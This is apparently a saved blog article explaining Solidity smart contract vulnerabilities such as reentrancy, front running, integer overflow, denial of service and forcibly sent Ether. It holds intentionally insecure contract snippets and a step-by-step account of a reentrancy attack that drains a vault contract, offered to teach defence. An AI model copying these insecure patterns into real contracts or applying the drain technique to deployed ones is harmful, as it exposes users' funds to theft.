<p>In this case, the attacker calls&nbsp;<code>transfer()</code>&nbsp;when their code is executed on the external call in&nbsp;<code>withdrawBalance</code>. Since their balance has not yet been set to 0, they are able to transfer the tokens even though they already received the withdrawal. This vulnerability was also used in the DAO attack.</p>



<p>The same solutions will work, with the same caveats. Also note that in this example, both functions were part of the same contract. However, the same bug can occur across multiple contracts, if those contracts share state.</p>



<h3 class="wp-block-heading has-background" id="pitfalls-in-race-condition-solutions" style="background-color:#f78da812">Pitfalls in Race Condition Solutions</h3>



<p>Since race conditions can occur across multiple functions, and even multiple contracts, any solution aimed at preventing reentry will not be sufficient.</p>



<p>Instead, we have recommended finishing all internal work first, and only then calling the external function. This rule, if followed carefully, will allow you to avoid race conditions. However, you need to not only avoid calling external functions too soon, but also avoid calling functions which call external functions. For example, the following is insecure:</p>



<pre class="wp-block-preformatted">// INSECURE
mapping (address =&gt; uint) private userBalances;
mapping (address =&gt; bool) private claimedBonus;
mapping (address =&gt; uint) private rewardsForA;

function withdraw(address recipient) public {
    uint amountToWithdraw = userBalances[recipient];
    rewardsForA[recipient] = 0;
    require(recipient.call.value(amountToWithdraw)());
}

function getFirstWithdrawalBonus(address recipient) public {
    require(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once

    rewardsForA[recipient] += 100;
    withdraw(recipient); // At this point, the caller will be able to execute getFirstWithdrawalBonus again.
    claimedBonus[recipient] = true;
}
</pre>



<p>Even though&nbsp;<code>getFirstWithdrawalBonus()</code>&nbsp;doesn’t directly call an external contract, the call in&nbsp;<code>withdraw()</code>&nbsp;is enough to make it vulnerable to a race condition. You therefore need to treat&nbsp;<code>withdraw()</code>&nbsp;as if it were also untrusted.</p>



<pre class="wp-block-preformatted">mapping (address =&gt; uint) private userBalances;
mapping (address =&gt; bool) private claimedBonus;
mapping (address =&gt; uint) private rewardsForA;

function untrustedWithdraw(address recipient) public {
    uint amountToWithdraw = userBalances[recipient];
    rewardsForA[recipient] = 0;
    require(recipient.call.value(amountToWithdraw)());
}

function untrustedGetFirstWithdrawalBonus(address recipient) public {
    require(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once

    claimedBonus[recipient] = true;
    rewardsForA[recipient] += 100;
    untrustedWithdraw(recipient); // claimedBonus has been set to true, so reentry is impossible
}
</pre>



<p>In addition to the fix making reentry impossible,&nbsp;<a href="https://github.com/ConsenSys/smart-contract-best-practices#mark-untrusted-contracts">untrusted functions have been marked.</a>&nbsp;This same pattern repeats at every level: since&nbsp;<code>untrustedGetFirstWithdrawalBonus()</code>&nbsp;calls&nbsp;<code>untrustedWithdraw()</code>, which calls an external contract, you must also treat&nbsp;<code>untrustedGetFirstWithdrawalBonus()</code>&nbsp;as insecure.</p>



<p>Another solution often suggested is a&nbsp;<a href="https://en.wikipedia.org/wiki/Mutual_exclusion">mutex</a>. This allows you to “lock” some state so it can only be changed by the owner of the lock. A simple example might look like this:</p>



<pre class="wp-block-preformatted">// Note: This is a rudimentary example, and mutexes are particularly useful where there is substantial logic and/or shared state
mapping (address =&gt; uint) private balances;
bool private lockBalances;

function deposit() payable public returns (bool) {
    require(!lockBalances);
    lockBalances = true;
    balances[msg.sender] += msg.value;
    lockBalances = false;
    return true;
}

function withdraw(uint amount) payable public returns (bool) {
    require(!lockBalances &amp;&amp; amount &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount);
    lockBalances = true;

    if (msg.sender.call(amount)()) { // Normally insecure, but the mutex saves it
      balances[msg.sender] -= amount;
    }

    lockBalances = false;
    return true;
}
</pre>



<p>If the user tries to call&nbsp;<code>withdraw()</code>&nbsp;again before the first call finishes, the lock will prevent it from having any effect. This can be an effective pattern, but it gets tricky when you have multiple contracts that need to cooperate. The following is insecure:</p>



<pre class="wp-block-preformatted">// INSECURE
contract StateHolder {
    uint private n;
    address private lockHolder;

    function getLock() {
        require(lockHolder == 0);
        lockHolder = msg.sender;
    }

    function releaseLock() {
        lockHolder = 0;
    }

    function set(uint newState) {
        require(msg.sender == lockHolder);
        n = newState;
    }
}
</pre>



<p>An attacker can call&nbsp;<code>getLock()</code>, and then never call&nbsp;<code>releaseLock()</code>. If they do this, then the contract will be locked forever, and no further changes will be able to be made. If you use mutexes to protect against race conditions, you will need to carefully ensure that there are no ways for a lock to be claimed and never released. (There are other potential dangers when programming with mutexes, such as deadlocks and livelocks. You should consult the large amount of literature already written on mutexes, if you decide to go this route.)</p>



<p>* Some may object to the use of the term&nbsp;<em>race condition</em>&nbsp;since Ethereum does not currently have true parallelism. However, there is still the fundamental feature of logically distinct processes contending for resources, and the same sorts of pitfalls and potential solutions apply.</p>



<h2 class="wp-block-heading has-background" id="transaction-ordering-dependence-tod-front-running" style="background-color:#f78da812">Transaction-Ordering Dependence (TOD) / Front Running</h2>



<p>Above were examples of race conditions involving the attacker executing malicious code&nbsp;<em>within a single transaction</em>. The following are a different type of race condition inherent to Blockchains: the fact that&nbsp;<em>the order of transactions themselves</em>&nbsp;(within a block) is easily subject to manipulation.</p>



<p>Since a transaction is in the mempool for a short while, one can know what actions will occur, before it is included in a block. This can be troublesome for things like decentralized markets, where a transaction to buy some tokens can be seen, and a market order implemented before the other transaction gets included. Protecting against this is difficult, as it would come down to the specific contract itself. For example, in markets, it would be better to implement batch auctions (this also protects against high frequency trading concerns). Another way to use a pre-commit scheme (“I’m going to submit the details later”).</p>



<h2 class="wp-block-heading has-background" id="timestamp-dependence" style="background-color:#f78da812">Timestamp Dependence</h2>



<p>Be aware that the timestamp of the block can be manipulated by the miner, and all direct and indirect uses of the timestamp should be considered.&nbsp;<em>Block numbers</em>&nbsp;and&nbsp;<em>average block time</em>&nbsp;can be used to estimate time, but this is not future proof as block times may change (such as the changes expected during Casper).</p>



<pre class="wp-block-preformatted">uint someVariable = now + 1;

if (now % 2 == 0) { // the now can be manipulated by the miner

}

if ((someVariable - 100) % 2 == 0) { // someVariable can be manipulated by the miner

}
</pre>



<h2 class="wp-block-heading has-background" id="integer-overflow-and-underflow" style="background-color:#f78da812">Integer Overflow and Underflow </h2>



<p>Be aware there are around&nbsp;<a href="https://github.com/ethereum/solidity/issues/796#issuecomment-253578925">20 cases for overflow and underflow</a>.</p>



<p>Consider a simple token transfer:</p>



<pre class="wp-block-preformatted">mapping (address =&gt; uint256) public balanceOf;

// INSECURE
function transfer(address _to, uint256 _value) {
    /* Check if sender has balance */
    require(balanceOf[msg.sender] &gt;= _value);
    /* Add and subtract new balances */
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;
}

// SECURE
function transfer(address _to, uint256 _value) {
    /* Check if sender has balance and for overflows */
    require(balanceOf[msg.sender] &gt;= _value &amp;&amp; balanceOf[_to] + _value &gt;= balanceOf[_to]);

    /* Add and subtract new balances */
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;
}
</pre>



<p>If a balance reaches the maximum uint value (2^256) it will circle back to zero. This checks for that condition. This may or may not be relevant, depending on the implementation. Think about whether or not the uint value has an opportunity to approach such a large number. Think about how the uint variable changes state, and who has authority to make such changes. If any user can call functions which update the uint value, it’s more vulnerable to attack. If only an admin has access to change the variable’s state, you might be safe. If a user can increment by only 1 at a time, you are probably also safe because there is no feasible way to reach this limit.</p>



<p>The same is true for underflow. If a uint is made to be less than zero, it will cause an underflow and get set to its maximum value.</p>



<p>Be careful with the smaller data-types like uint8, uint16, uint24…etc: they can even more easily hit their maximum value.</p>



<p>Be aware there are around&nbsp;<a href="https://github.com/ethereum/solidity/issues/796#issuecomment-253578925">20 cases for overflow and underflow</a>.</p>



<h2 class="wp-block-heading has-background" id="dos-with-unexpected-revert" style="background-color:#f78da812">DoS with (Unexpected) revert</h2>



<p>Consider a simple auction contract:</p>



<pre class="wp-block-preformatted">// INSECURE
contract Auction {
    address currentLeader;
    uint highestBid;

    function bid() payable {
        require(msg.value &gt; highestBid);

        require(currentLeader.send(highestBid)); // Refund the old leader, if it fails then revert

        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}
</pre>



<p>When it tries to refund the old leader, it reverts if the refund fails. This means that a malicious bidder can become the leader while making sure that any refunds to their address will&nbsp;<em>always</em>&nbsp;fail. In this way, they can prevent anyone else from calling the&nbsp;<code>bid()</code>&nbsp;function, and stay the leader forever. A recommendation is to set up a&nbsp;<a href="https://github.com/ConsenSys/smart-contract-best-practices/#favor-pull-over-push-payments">pull payment system</a>&nbsp;instead, as described earlier.</p>



<p>Another example is when a contract may iterate through an array to pay users (e.g., supporters in a crowdfunding contract). It’s common to want to make sure that each payment succeeds. If not, one should revert. The issue is that if one call fails, you are reverting the whole payout system, meaning the loop will never complete. No one gets paid because one address is forcing an error.</p>



<pre class="wp-block-preformatted">address[] private refundAddresses;
mapping (address =&gt; uint) public refunds;

// bad
function refundAll() public {
    for(uint x; x &lt; refundAddresses.length; x++) { // arbitrary length iteration based on how many addresses participated
        require(refundAddresses[x].send(refunds[refundAddresses[x]])) // doubly bad, now a single failure on send will hold up all funds
    }
}
</pre>



<p>Again, the recommended solution is to&nbsp;<a href="https://ethereum-contract-security-techniques-and-tips.readthedocs.io/en/latest/known_attacks/#favor-pull-over-push-payments">favor pull over push payments</a>.</p>



<h2 class="wp-block-heading has-background" id="dos-with-block-gas-limit" style="background-color:#f78da812">DoS with Block Gas Limit</h2>



<p>You may have noticed another problem with the previous example: by paying out to everyone at once, you risk running into the block gas limit. Each Ethereum block can process a certain maximum amount of computation. If you try to go over that, your transaction will fail.</p>



<p>This can lead to problems even in the absence of an intentional attack. However, it’s especially bad if an attacker can manipulate the amount of gas needed. In the case of the previous example, the attacker could add a bunch of addresses, each of which needs to get a very small refund. The gas cost of refunding each of the attacker’s addresses could, therefore, end up being more than the gas limit, blocking the refund transaction from happening at all.</p>



<p>This is another reason to&nbsp;<a href="https://ethereum-contract-security-techniques-and-tips.readthedocs.io/en/latest/known_attacks/#favor-pull-over-push-payments">favor pull over push payments</a>.</p>



<p>If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. You will need to keep track of how far you’ve gone, and be able to resume from that point, as in the following example:</p>



<pre class="wp-block-preformatted">struct Payee {
    address addr;
    uint256 value;
}

Payee[] payees;
uint256 nextPayeeIndex;

function payOut() {
    uint256 i = nextPayeeIndex;
    while (i &lt; payees.length &amp;&amp; msg.gas &gt; 200000) {
      payees[i].addr.send(payees[i].value);
      i++;
    }
    nextPayeeIndex = i;
}
</pre>



<p>You will need to make sure that nothing bad will happen if other transactions are processed while waiting for the next iteration of the&nbsp;<code>payOut()</code>&nbsp;function. So only use this pattern if absolutely necessary.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-large"><img decoding="async" loading="lazy" width="1024" height="574" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-13-1024x57.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2240" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-13-1024x574.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-13-300x168.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-13-768x431.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-13.png 1453w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-large"><img decoding="async" loading="lazy" width="1024" height="565" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-14-1024x56.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2241" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-14-1024x565.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-14-300x166.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-14-768x424.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-14.png 1461w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p></p>



<p></p>



<p></p>



<p></p>



<h2 class="wp-block-heading has-background" id="forcibly-sending-ether-to-a-contract" style="background-color:#f78da812">Forcibly Sending Ether to a Contract</h2>



<p>It is possible to forcibly send Ether to a contract without triggering its fallback function. This is an important consideration when placing important logic in the fallback function or making calculations based on a contract’s balance. Take the following example:</p>



<pre class="wp-block-preformatted">contract Vulnerable {
    function () payable {
        revert();
    }

    function somethingBad() {
        require(this.balance &gt; 0);
        // Do something bad
    }
}
</pre>



<p>Contract logic seems to disallow payments to the contract and therefore disallow “something bad” from happening. However, a few methods exist for forcibly sending ether to the contract and therefore making its balance greater than zero.</p>



<p>The&nbsp;<code>selfdestruct</code>&nbsp;contract method allows a user to specify a beneficiary to send any excess ether.&nbsp;<code>selfdestruct</code>&nbsp;<a href="https://solidity.readthedocs.io/en/develop/security-considerations.html#sending-and-receiving-ether">does not trigger a contract’s fallback function</a>.</p>



<p>It is also possible to&nbsp;<a href="https://github.com/Arachnid/uscc/tree/master/submissions-2017/ricmoo">precompute</a>&nbsp;a contract’s address and send Ether to that address before deploying the contract.</p>



<p>Contract developers should be aware that Ether can be forcibly sent to a contract and should design contract logic accordingly. Generally, assume that it is not possible to restrict sources of funding to your contract.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><img decoding="async" loading="lazy" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-12.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2237" width="841" height="1145" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-12.png 590w, https://cryptodeeptech.ru/wp-content/uploads/2023/06/image-12-220x300.png 220w" sizes="(max-width: 841px) 100vw, 841px"></figure></div>


<h2 class="wp-block-heading has-background" id="deprecatedhistorical-attacks" style="background-color:#f78da812">Deprecated/historical attacks</h2>



<p>These are attacks which are no longer possible due to changes in the protocol or improvements to solidity. They are recorded here for posterity and awareness.</p>



<h3 class="wp-block-heading" id="call-depth-attack-deprecated">Call Depth Attack (deprecated)</h3>



<p>As of the&nbsp;<a href="https://github.com/ethereum/EIPs/issues/150">EIP 150</a>&nbsp;hardfork, call depth attacks are no longer relevant<sup><a href="http://ethereum.stackexchange.com/questions/9398/how-does-eip-150-change-the-call-depth-attack">*</a></sup>&nbsp;(all gas would be consumed well before reaching the 1024 call depth limit).</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Denial of Service</h2>



<p>Every node in the network consumes resources when maintaining a copy of the distributed ledger.&nbsp; Every transaction requires storage space and computational cycles to process when a node is updating the state of its copy of the shared virtual machine.</p>



<p>Ethereum compensates nodes for this effort by having all transaction creators pay “gas” (fractions of an Ether) to submit and run a transaction.&nbsp; This gas is paid to the node creating the block (which should vary from block to block).&nbsp; The more computationally expensive the operation, the more gas required.</p>



<p>Ethereum also includes a cap on the amount of gas that a particular transaction or block can contain.&nbsp; This helps to protect the network against spam, but it leaves it open to Denial of Service attacks.</p>



<p>The code sample above shows an example of a function that has a gas-based DoS vulnerability.&nbsp; Notice that the number of loop iterations depends on a user-provided value and is always increasing.</p>



<p>This means that the contract can be placed in a state where it takes more gas to run the function than can fit in a transaction.&nbsp; Since running out of gas terminates execution and causes the execution state to be rolled back to where it was before the transaction was processed, this makes the function completely unrunnable.</p>



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Reentrancy</h2>



<p>Reentrancy is probably the most famous of the vulnerabilities that can exist in an Ethereum smart contract.&nbsp; This vulnerability was behind the famous DAO hack that resulted in the split of the Ethereum and Ethereum Classic blockchains.</p>



<p>Reentrancy vulnerabilities are possible due to the existence of fallback functions in Ethereum smart contracts.&nbsp; Smart contracts are able to receive transfers of value, and a fallback function contains code that is executed if a smart contract is sent Ether.&nbsp; This creates a potential vulnerability since it allows another contract to execute code between two instructions of the contract sending the value.</p>



<p>The code sample above shows an example of a smart contract with a reentrancy vulnerability.&nbsp; The logic follows a three-step flow:</p>



<ol>
<li>Validate that the withdrawal is valid</li>



<li>Perform the withdrawal</li>



<li>Update the contract’s internal balance sheet</li>
</ol>



<p>While this flow makes sense, it also leaves the function vulnerable.&nbsp; At line three, the function calls the fallback function of the function that called it.&nbsp; This fallback function could contain another call to withdrawal, which would create the following flow:</p>



<ol>
<li>Malicious smart contract calls withdrawal</li>



<li>Withdrawal validates request (line 2)</li>



<li>Withdrawal sends value to malicious function (line 2)</li>



<li>Malicious function’s fallback function calls withdrawal</li>



<li>Withdrawal validates request (line 2)</li>



<li>Withdrawal sends value to malicious function (line 2)</li>



<li>Malicious function’s fallback function returns without doing anything</li>



<li>Withdrawal updates internal ledger (line 3)</li>



<li>Withdrawal returns to malicious fallback function (call from step 4)</li>



<li>Malicious fallback function returns to withdrawal</li>



<li>Withdrawal updates internal ledger (line 3)</li>



<li>Withdrawal returns to malicious smart contract (call from line 1)</li>
</ol>



<p>This flow is problematic because the internal ledger updates (steps 8 and 11) come after the value transfers (steps 3 and 6).&nbsp; The second time that the malicious function calls withdrawal (step 4), withdrawal has no record of the transfer from step 3.&nbsp; The test performed at step 5 tests against the original account balance (before step 3), not the value that should be in the account after the step 3 transfer.</p>



<p>This allows an attacker to withdraw more Ether from its account than it contains with the excess coming from other accounts on the smart contract.&nbsp; Fixing this issue requires updating the internal state (line 4 of the code) before making the transfer (line 3 of the code), then testing afterward to ensure that the transfer was successful.</p>



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Short Addresses</h2>



<p>Short address vulnerabilities arise from the fact that smart contracts can assume the length of its arguments without checking them.&nbsp; For example, a function may assume that addresses are 20 bytes long but not check this fact, allowing an attacker to submit a 19-byte address.</p>



<p>If such a function calls a function that does enforce argument lengths, then the called function may take a byte from the next argument to meet the 20-byte target.&nbsp; Later on, this argument will be right-padded to reach its desired length.</p>



<p>This creates a problem if, for example, the first function validates a transfer and the second performs it.&nbsp; The value being transferred will be 256 times the value validated.</p>



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Unchecked Return Values</h2>



<p>Like many other programming languages, Solidity has the concept of functions.&nbsp; Solidity functions can take arguments and return values based upon the result of their execution.</p>



<p>One of the potential sources of confusion for Solidity programmers is the fact that similar functions handle errors differently.&nbsp; For example, the low-level function&nbsp;<strong>send()</strong>&nbsp;in Solidity returns a value of False upon experiencing an error, while&nbsp;<strong>transfer()</strong>, a similar function, will cause execution to be halted and rolled up so that the transaction containing the error never happened.</p>



<p>This difference between two similar functions creates problems if developers do not know how to identify and properly handle errors when making function calls.&nbsp; A call to&nbsp;<strong>send()</strong>&nbsp;that fails will allow execution to continue if the return value is not checked.&nbsp; In contrast, most other low-level calls do not require a check because they terminate and roll up execution.</p>



<p>Reentrancy is probably the most famous Ethereum vulnerability, and it surprised everyone when discovered for the first time. It was first unveiled during a multimillion dollar heist which led to a hard fork of Ethereum. Reentrancy occurs when external contract calls are allowed to make new calls to the calling contract before the initial execution is complete. This means that the contract state may change in the middle of its execution, as a result of a call to an untrusted contract or the use of a low level function with an external address. One of the major dangers of calling external contracts is that they can take over the control flow. In a reentrancy attack, a malicious contract calls back into the calling contract before the first invocation of the function is finished. This may cause the different invocations of the function to interact in undesirable ways.</p>



<p>As is often the case with blockchain technology, the problems surrounding reentrancy in smart contracts do not originate in blockchain, but rather provide a novel and complex example of them.</p>



<p>Reentrancy is a term that has been present in computing for many years, and simply refers to the process whereby a process can be interrupted mid way through execution, have a different occurrence of the same function begin, then have both processes finish to completion. Reentrant functions are safely used in computing everyday. One good example is beginning an email draft in a server, exiting it to send another email, then being able to return to the draft to finish and send it.</p>



<p>So that’s a benign case of reentrancy that is simple, useful and not a threat. The problems begin to arise when this example is shifted away from a person sending an email, to a smart contract sending money. It’s a classic example of how cryptocurrencies and blockchain technology have upped the stakes of computing, providing some of its most sophisticated applications, whilst also making its pitfalls far more painful. The scale and cost of such reentrancy attacks should be a reminder that it is impossible to be too safe when it comes to code, and that a third party smart contract audit should be a staple of any project taking the security of their smart contracts seriously.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img decoding="async" loading="lazy" width="957" height="588" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-2.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2180"></figure></div>


<h2 class="wp-block-heading has-background" id="EthereumSmartContractsVulnerabilities:Reentrancy-VulnerabilityDetails" style="background-color:#f78da812">Vulnerability Details</h2>



<p>The following image contains a function vulnerable to a reentrancy attack. When the low level&nbsp;<code>call()</code>&nbsp;function sends ether to the&nbsp;<code>msg.sender</code>&nbsp;address, it becomes vulnerable; if the address is a smart contract, the payment will trigger its fallback function with what’s left of the transaction gas:</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img decoding="async" loading="lazy" width="1102" height="328" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-3(1).png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2182"></figure></div>


<p>An attacker can carefully construct a contract at an external address which contains malicious code in the&nbsp;<a href="https://solidity.readthedocs.io/en/latest/contracts.html?highlight=fallback#fallback-function">fallback function</a>. Thus, when a contract sends ether to this address, it will invoke the malicious code. Typically the malicious code executes a function on the vulnerable contract, performing operations which were not anticipated by the developer. The name “re-entrancy” comes from the fact that the external malicious contract calls back a function on the vulnerable contract and “<em>re-enters</em>” code execution at an arbitrary location on the vulnerable contract.</p>



<p>To clarify this, consider the simple vulnerable contract, which acts as an Ethereum vault only allowing depositors to withdraw 1 ether per week.</p>



<p>EtherStore.sol:</p>



<figure class="wp-block-image"><img decoding="async" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image2022-5-27_1.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks"></figure>



<h5 class="wp-block-heading"><em>Image 3: Contract Vulnerable to Reentrancy</em></h5>



<p>This contract has two public functions.&nbsp;<code>depositFunds()</code>&nbsp;and&nbsp;<code>withdrawFunds()</code>. The&nbsp;<code>depositFunds()</code>&nbsp;function simply increments the senders balances. The&nbsp;<code>withdrawFunds()</code>&nbsp;function allows the sender to specify the amount of wei to withdraw. It will only succeed if the requested amount to withdraw is less than 1 ether and a withdrawal hasn’t occurred in the last week.&nbsp;</p>



<p>The vulnerability comes on line [17] where the requested amount of ether is sent to the user. Consider a malicious attacker creating the following contract</p>



<p>Attack.sol:</p>



<figure class="wp-block-image"><img decoding="async" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image2022-(1).png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks"></figure>



<h5 class="wp-block-heading"><em>Image 4: Attacker Contract</em></h5>



<p>Let’s see how this malicious contract can exploit the&nbsp;<code>EtherStore</code>&nbsp;contract. The attacker would create the above contract with the&nbsp;<code>EtherStore</code>‘s contract address as the constructor parameter. This will initialize and point the public variable&nbsp;<code>etherStore</code>&nbsp;to the contract to be attacked.</p>



<p>The attacker would then call the&nbsp;<code>pwnEtherStore()</code>&nbsp;function, with some amount of ether (greater than or equal to 1), let’s say&nbsp;<code>1 ether</code>&nbsp;for this example. Assume a number of other users have deposited ether into this contract, such that it’s current balance is&nbsp;<code>10 ether</code>. The following would then occur:</p>



<ol>
<li><strong>Attack.sol – Line [15]</strong>&nbsp;– The&nbsp;<code>depositFunds()</code>&nbsp;function of the EtherStore contract will be called with a&nbsp;<code>msg.value</code>&nbsp;of&nbsp;<code>1 ether</code>&nbsp;(and a lot of gas). The sender (<code>msg.sender</code>) will be the malicious contract (<code>address</code>). Thus,&nbsp;<code>balances[address] = 1 ether</code>.</li>



<li><strong>Attack.sol – Line [17]</strong>&nbsp;– The malicious contract will then call the&nbsp;<code>withdrawFunds()</code>&nbsp;function of the&nbsp;<code>EtherStore</code>&nbsp;contract with a parameter of&nbsp;<code>1 ether</code>. This will pass all the requirements (Lines [12]-[16] of the&nbsp;<code>EtherStore</code>&nbsp;contract) as no previous withdrawals have been made.</li>



<li><strong>EtherStore.sol – Line [17]</strong>&nbsp;– The contract will then send&nbsp;<code>1 ether</code>&nbsp;back to the malicious contract.</li>



<li><strong>Attack.sol – Line [25]</strong>&nbsp;– The ether sent to the malicious contract will then execute the fallback function.</li>



<li><strong>Attack.sol – Line [26]</strong>&nbsp;– The total balance of the EtherStore contract was&nbsp;<code>10 ether</code>&nbsp;and is now&nbsp;<code>9 ether</code>&nbsp;so this if statement passes.</li>



<li><strong>Attack.sol – Line [27]</strong>&nbsp;– The fallback function then calls the&nbsp;<code>EtherStore</code>&nbsp;<code>withdrawFunds()</code>&nbsp;function again and “<em>re-enters</em>” the&nbsp;<code>EtherStore</code>&nbsp;contract.</li>



<li><strong>EtherStore.sol – Line [11]</strong>&nbsp;– In this second call to&nbsp;<code>withdrawFunds()</code>, the balance is still&nbsp;<code>1 ether</code>&nbsp;as line [18] has not yet been executed. Thus, the value remains as&nbsp;<code>balances[address] = 1 ether</code>. This is also the case for the&nbsp;<code>lastWithdrawTime</code>&nbsp;variable. Again, all the requirements are passed.</li>



<li><strong>EtherStore.sol – Line [17]</strong>&nbsp;– Another&nbsp;<code>1 ether is withdrawn</code>.</li>



<li><strong>Steps 4-8 will repeat</strong>&nbsp;– until&nbsp;<code>EtherStore.balance &gt;= 1</code>&nbsp;as dictated by line [26] in&nbsp;<code>Attack.sol</code>.</li>



<li><strong>Attack.sol – Line [26]</strong>&nbsp;– Once there is less than 1 ether left in the&nbsp;<code>EtherStore</code>&nbsp;contract, this if statement will fail. This will then allow lines [18] and [19] of the&nbsp;<code>EtherStore</code>&nbsp;contract to be executed (for each call to the&nbsp;<code>withdrawFunds()</code>&nbsp;function).</li>



<li><strong>EtherStore.sol – Lines [18] and [19]</strong>&nbsp;– The&nbsp;<code>balances</code>&nbsp;and&nbsp;<code>lastWithdrawTime</code>&nbsp;mappings will be set and the execution will end.</li>
</ol>



<p>The final result, is that the attacker has withdrawn all ether from the&nbsp;<code>EtherStore</code>&nbsp;contract, instantaneously with a single transaction.</p>



<h1 class="wp-block-heading has-background" id="EthereumSmartContractsVulnerabilities:Reentrancy-Typesofreentrancyattacks" style="background-color:#f78da812">Types of reentrancy attacks</h1>



<p>There are three main types of reentrancy attacks: single function reentrancy, cross-function reentrancy and cross-contract reentrancy.</p>



<h2 class="wp-block-heading" id="EthereumSmartContractsVulnerabilities:Reentrancy-SingleFunctionReentrancy">Single Function Reentrancy</h2>



<p>This type of attack is the simplest and easiest to prevent. It occurs when the vulnerable function is the same function the attacker is trying to recursively call.</p>



<figure class="wp-block-image"><img decoding="async" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image2022-7-26_1.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks"></figure>



<h5 class="wp-block-heading"><em>Image 5: Single Function Reentrancy</em></h5>



<p>Since the user’s balance is not set to 0 until the very end of the function, the second (and later) invocations will still succeed and will withdraw the balance over and over again.<code></code></p>



<p>In the example given, the best way to prevent this attack is to make sure an external function is not called until all the required internal work has been completed:</p>



<figure class="wp-block-image"><img decoding="async" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image2022-(2).png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks"></figure>



<h5 class="wp-block-heading"><em>Image 6: Single Function Reentrancy Fixed</em></h5>



<p>Note that if another function also called&nbsp;<code>withdrawBalance()</code>, it would be potentially subject to the same attack, so any function which calls an untrusted contract must also be treated as untrusted.&nbsp;</p>



<h2 class="wp-block-heading has-background" id="EthereumSmartContractsVulnerabilities:Reentrancy-Cross-functionReentrancy" style="background-color:#f78da812">Cross-function Reentrancy</h2>



<p>These attacks are harder to detect. A cross-function reentrancy attack is possible when a vulnerable function shares state with another function that has a desirable effect for the attacker.</p>



<pre class="wp-block-code"><code></code></pre>



<h5 class="wp-block-heading"><em>Image 7: Cross-function Reentrancy</em></h5>



<p>In this case, the attacker calls&nbsp;<code>transfer()</code>&nbsp;when their code is executed on the external call in&nbsp;<code>withdrawBalance</code>. Since their balance has not yet been set to 0, they are able to transfer the tokens even though they already received the withdrawal. The same solutions will work, with the same caveats. Also note that in this example, both functions were part of the same contract. However, the same bug can occur across multiple contracts, if those contracts share state.</p>



<h2 class="wp-block-heading has-background" id="EthereumSmartContractsVulnerabilities:Reentrancy-Cross-contractReentrancy" style="background-color:#f78da812">Cross-contract Reentrancy</h2>



<p>Cross-contract reentrancy can happen when the state from one contract is used in another contract, but that state is not fully updated before getting called.</p>



<p>The conditions required for the cross-contract reentrancy to be possible are as follows:</p>



<ul>
<li>The execution flow can be controlled by the attacker to manipulate the contract state.</li>



<li>The value of the state in the contract is shared or used in another contract.</li>
</ul>



